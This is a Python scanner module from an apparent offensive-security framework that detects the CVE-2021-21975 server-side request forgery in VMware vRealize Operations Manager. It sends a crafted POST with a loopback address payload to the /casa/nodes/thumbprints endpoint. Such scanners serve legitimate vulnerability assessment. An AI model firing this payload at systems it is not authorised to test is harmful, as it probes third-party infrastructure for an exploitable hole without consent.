#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""vRealize Operations Manager API is susceptible to server-side request forgery."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'vRealize Operations Manager API - Server-Side Request Forgery Detection',
        'description': 'vRealize Operations Manager API is susceptible to server-side request forgery. A malicious actor with network access to the vRealize Operations Manager API can steal administrative credentials or trigger remote code execution using CVE-2021-21983.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'kev', 'packetstorm', 'ssrf', 'vmware', 'vrealize', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.vmware.com/security/advisories/VMSA-2021-0004.html',
            'http://packetstormsecurity.com/files/162349/VMware-vRealize-Operations-Manager-Server-Side-Request-Forgery-Code-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21975',
        ],
        'cve': 'CVE-2021-21975',
    }

    def run(self):
        path = '/casa/nodes/thumbprints'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json;charset=UTF-8'}, data='["127.0.0.1:443/ui/"]\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('vRealize Operations Manager', 'thumbprint', 'address',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='vRealize Operations Manager API - Server-Side Request Forgery detected', path=path)
            return True
        return False

